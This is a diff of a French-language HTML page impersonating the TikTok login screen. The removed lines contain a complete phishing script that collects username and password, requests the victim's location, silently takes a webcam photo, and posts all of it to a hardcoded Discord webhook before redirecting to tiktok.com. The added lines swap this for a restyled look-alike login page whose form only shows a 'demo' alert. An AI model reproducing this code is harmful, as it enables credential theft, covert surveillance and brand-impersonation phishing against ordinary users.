@@ -1,184 +1,248 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion TikTok</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>TikTok - Connexion</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       margin: 0;
+      background: #fff;
+      font-family: 'Inter', Arial, sans-serif;
+      color: #161823;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-    .container {
-      background-color: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 350px;
+    .login-container {
+      width: 350px;
+      max-width: 96vw;
+      margin: 24px;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+      padding: 32px 20px 24px 20px;
       text-align: center;
     }
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+    .tiktok-logo {
+      width: 48px;
+      margin-bottom: 16px;
     }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #fe2c55;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-      margin-top: 8px;
+    .login-title {
+      font-size: 1.6em;
+      font-weight: 700;
+      margin-bottom: 16px;
     }
-    button:disabled {
-      background-color: #e91b44;
-      cursor: not-allowed;
+    .login-desc {
+      color: #555;
+      margin-bottom: 24px;
+      font-size: 1em;
     }
-    button:hover:enabled {
-      background-color: #e91b44;
+    .login-methods {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 16px;
     }
-    .checkbox-label {
-      font-size: 0.95em;
+    .login-btn {
       display: flex;
       align-items: center;
-      margin: 12px 0;
-      text-align: left;
+      justify-content: flex-start;
+      gap: 14px;
+      font-weight: 500;
+      font-size: 1em;
+      padding: 12px 16px;
+      border-radius: 6px;
+      border: 1px solid #e3e3e4;
+      cursor: pointer;
+      background: #fff;
+      color: #161823;
+      transition: background 0.18s;
     }
-    .checkbox-label input[type="checkbox"] {
-      margin-right: 8px;
+    .login-btn:hover {
+      background: #f7f7f7;
+      border: 1px solid #fe2c55;
+      color: #fe2c55;
     }
-    #notice {
-      font-size: 0.95em;
-      color: #c00;
-      margin-bottom: 10px;
+    .login-btn img {
+      width: 24px;
+      height: 24px;
+      object-fit: contain;
     }
-    #video, #canvas {
-      display: none;
+    .divider {
+      position: relative;
+      margin: 18px 0 12px 0;
+      text-align: center;
+      font-size: 0.97em;
+      color: #aaa;
+    }
+    .divider:before, .divider:after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 32%;
+      height: 1px;
+      background: #e3e3e4;
+    }
+    .divider:before {
+      left: 0;
+    }
+    .divider:after {
+      right: 0;
+    }
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 8px;
+    }
+    .login-form input {
+      padding: 12px;
+      font-size: 1em;
+      border: 1px solid #e3e3e4;
+      border-radius: 6px;
+      outline: none;
+      transition: border 0.15s;
+    }
+    .login-form input:focus {
+      border-color: #fe2c55;
+    }
+    .login-form button {
+      margin-top: 8px;
+      background: #fe2c55;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 1.1em;
+      padding: 12px;
+      cursor: pointer;
+      transition: background 0.13s;
+    }
+    .login-form button:hover {
+      background: #e91b44;
+    }
+    .forgot-link {
+      color: #fe2c55;
+      text-decoration: none;
+      font-size: 0.97em;
+      margin-top: 4px;
+      align-self: flex-end;
+    }
+    .qr-section {
+      background: #f7f7f7;
+      border-radius: 8px;
+      padding: 18px 0;
+      margin-bottom: 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .qr-section img {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 6px;
+    }
+    .qr-desc {
+      font-size: 0.97em;
+      color: #555;
+    }
+    .signup-footer {
+      margin-top: 16px;
+      font-size: 1em;
+      color: #444;
+    }
+    .signup-footer a {
+      color: #fe2c55;
+      text-decoration: none;
+      font-weight: 600;
+      margin-left: 4px;
+    }
+    @media (max-width: 400px) {
+      .login-container {padding: 12px;}
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Connecte-toi à TikTok</h2>
-    <div id="notice">
-      
+  <div class="login-container">
+    <img src="https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg" alt="TikTok" class="tiktok-logo">
+    <div class="login-title">Se connecter à TikTok</div>
+    <div class="login-desc">Choisis une méthode pour te connecter</div>
+    <div class="login-methods">
+      <button class="login-btn" onclick="showQR()">
+        <img src="https://static.thenounproject.com/png/281786-200.png" alt="QR Code">
+        Utiliser le code QR
+      </button>
+      <button class="login-btn" onclick="showForm('phone')">
+        <img src="https://cdn-icons-png.flaticon.com/512/126/126509.png" alt="Phone">
+        Utiliser téléphone / e-mail / nom d’utilisateur
+      </button>
+      <button class="login-btn" onclick="showMsg('Google')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+        Continuer avec Google
+      </button>
+      <button class="login-btn" onclick="showMsg('Facebook')">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+        Continuer avec Facebook
+      </button>
+      <button class="login-btn" onclick="showMsg('Twitter')">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+        Continuer avec Twitter
+      </button>
+      <button class="login-btn" onclick="showMsg('Apple')">
+        <img src="https://cdn-icons-png.flaticon.com/512/179/179309.png" alt="Apple">
+        Continuer avec Apple
+      </button>
+      <button class="login-btn" onclick="showMsg('Instagram')">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
+        Continuer avec Instagram
+      </button>
     </div>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required autocomplete="username">
-      <input type="password" id="password" placeholder="Mot de passe" required autocomplete="current-password">
-      <label class="checkbox-label">
-        <input type="checkbox" id="acceptTerms" required>
-        J'accepte les conditions d'utilisation
-      </label>
-      <button type="submit" id="submitBtn" disabled>Se connecter</button>
-      <video id="video" autoplay style="display:none"></video>
-      <canvas id="canvas" style="display:none"></canvas>
+    <div class="divider">ou</div>
+    <form class="login-form" id="loginForm" style="display:none;">
+      <input type="text" id="loginInput" placeholder="Téléphone, e-mail ou nom d'utilisateur" required>
+      <input type="password" id="passwordInput" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+      <a href="#" class="forgot-link">Mot de passe oublié ?</a>
     </form>
+    <div class="qr-section" id="qrSection" style="display:none;">
+      <img src="https://www.qr-code-generator.com/wp-content/themes/qr/new_structure/assets/media/images/qr-code.png" alt="QR Code">
+      <div class="qr-desc">
+        Scanne ce code QR avec l’application TikTok pour te connecter.
+      </div>
+      <button onclick="hideQR()" class="login-btn" style="width:90%;margin:10px auto 0 auto;">
+        <img src="https://cdn-icons-png.flaticon.com/512/1828/1828665.png" width="20" alt="Retour">
+        Retour
+      </button>
+    </div>
+    <div class="signup-footer">
+      Pas encore de compte ?
+      <a href="#">Inscris-toi</a>
+    </div>
   </div>
   <script>
-    // Activation du bouton selon la case à cocher
-    const acceptTerms = document.getElementById('acceptTerms');
-    const submitBtn = document.getElementById('submitBtn');
-    acceptTerms.addEventListener('change', function() {
-      submitBtn.disabled = !this.checked;
-    });
-
-    // Webcam et géolocalisation
-    let imageBlob = null;
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    let stream = null;
-
-    function startWebcam() {
-      return new Promise((resolve, reject) => {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(s) {
-              stream = s;
-              video.srcObject = stream;
-              video.play();
-              video.onloadedmetadata = () => resolve();
-            })
-            .catch(reject);
-        } else {
-          reject('Webcam non supportée');
-        }
-      });
+    function showForm(meth) {
+      document.getElementById('loginForm').style.display = 'flex';
+      document.getElementById('qrSection').style.display = 'none';
     }
-
-    function takePhoto() {
-      return new Promise((resolve, reject) => {
-        try {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          canvas.toBlob(function(blob) {
-            imageBlob = blob;
-            if (stream && stream.getTracks) {
-              stream.getTracks().forEach(track => track.stop());
-            }
-            resolve();
-          }, 'image/png');
-        } catch (e) {
-          reject(e);
-        }
-      });
+    function showQR() {
+      document.getElementById('qrSection').style.display = 'flex';
+      document.getElementById('loginForm').style.display = 'none';
     }
-
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    function hideQR() {
+      document.getElementById('qrSection').style.display = 'none';
+    }
+    function showMsg(meth) {
+      alert("La connexion via " + meth + " n'est pas disponible sur cette démo.");
+    }
+    // Optionnel : submit form
+    document.getElementById('loginForm').onsubmit = function(e) {
       e.preventDefault();
-
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
-
-      if (!navigator.geolocation) {
-        alert("La géolocalisation n'est pas supportée par votre navigateur.");
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        startWebcam().then(() => {
-          setTimeout(() => {
-            takePhoto().then(() => {
-              const form = new FormData();
-              const content = `🔔 Connexion TikTok\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}\n🌍 Localisation :\nLatitude : ${lat}\nLongitude : ${lon}\n📸 Photo jointe`;
-              form.append("content", content);
-              if (imageBlob) {
-                form.append("file", imageBlob, "photo.png");
-              }
-              fetch(webhookURL, {
-                method: "POST",
-                body: form
-              }).finally(() => {
-                window.location.href = "https://www.tiktok.com";
-              });
-            }).catch(() => {
-              alert("Erreur lors de la prise de photo.");
-            });
-          }, 1000); // Attente pour webcam
-        }).catch(() => {
-          alert("Impossible d'accéder à la webcam.");
-        });
-      }, function() {
-        alert("Impossible d'obtenir la localisation.");
-      });
-    });
+      alert("Connexion en cours (démo, aucune authentification réelle).");
+    };
   </script>
 </body>
 </html>
